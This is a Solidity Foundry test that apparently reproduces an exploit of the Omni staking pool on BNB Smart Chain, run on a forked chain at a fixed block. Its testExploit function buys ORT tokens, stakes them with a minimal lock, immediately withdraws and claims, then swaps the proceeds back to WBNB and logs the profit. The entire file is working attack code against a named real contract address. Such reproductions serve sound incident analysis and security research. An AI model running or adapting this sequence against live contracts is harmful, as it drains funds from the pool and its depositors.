// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/interface/interface.sol";

interface OmniStakingPool {
    function invest(uint256 end_data, uint256 qty_ort) external;

    function withdrawAndClaim(uint256 lockId) external;

    function getUserStaking(address user) external returns (uint256[] memory);
}

contract ContractTest is Test {
    address Omni = 0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB;
    address ORT = 0x1d64327C74d6519afeF54E58730aD6fc797f05Ba;

    Uni_Router_V2 Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    function setUp() public {
        vm.createSelectFork("bsc", 24_850_696);
    }

    function testExploit() public {
        IWBNB(WBNB).deposit{value: 1e18}();
        console2.log("before: ", WBNB.balanceOf(address(this)));
        bscSwap(address(WBNB), ORT, 1e18);
        console2.log("before: ", IERC20(ORT).balanceOf(address(this)));
        IERC20(ORT).approve(Omni, type(uint256).max);
        OmniStakingPool(Omni).invest(1, 10);
        console2.log("add: ", address(this));
        uint256[] memory stake = OmniStakingPool(Omni).getUserStaking(
            address(this)
        );
        console2.log("--- ~ testExploit ~ stake:", stake[0]);
        OmniStakingPool(Omni).withdrawAndClaim(stake[0]);
        // profit
        bscSwap(ORT, address(WBNB), IERC20(ORT).balanceOf(address(this)));
        console2.log("after: ", WBNB.balanceOf(address(this)));
        console2.log("after: ", IERC20(ORT).balanceOf(address(this)));
    }

    receive() external payable {}

    function bscSwap(
        address tokenFrom,
        address tokenTo,
        uint256 amount
    ) internal {
        IERC20(tokenFrom).approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
